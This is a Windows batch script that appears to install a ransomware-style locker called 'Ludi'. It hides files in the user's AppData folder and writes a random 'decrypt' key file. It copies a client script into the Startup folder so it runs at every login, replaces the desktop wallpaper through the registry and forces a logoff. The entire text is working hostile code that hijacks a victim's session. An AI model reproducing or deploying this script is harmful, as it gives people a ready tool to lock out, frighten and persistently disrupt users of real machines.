@echo off
md C:\Users\%username%\AppData\Local\Ludi
echo %random%%random% > C:\Users\%username%\AppData\Local\Ludi\ludidecrypt.lud
move "abort.bat" "C:\Users\%username%\AppData\Local\Ludi"
move "incorrect.bat" "C:\Users\%username%\AppData\Local\Ludi"
move "ludiclient.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
move "ludipaper.jpg" "C:\Users\%username%\AppData\Local\Ludi"
move "removed.jpg" "C:\Users\%username%\AppData\Local\Ludi"
move "warn.vbs" "C:\Users\%username%\AppData\Local\Ludi"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\%username%\AppData\Local\Ludi\ludipaper.jpg /f
cls
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
ping localhost 1.1.1.1 >nul
logoff
exit
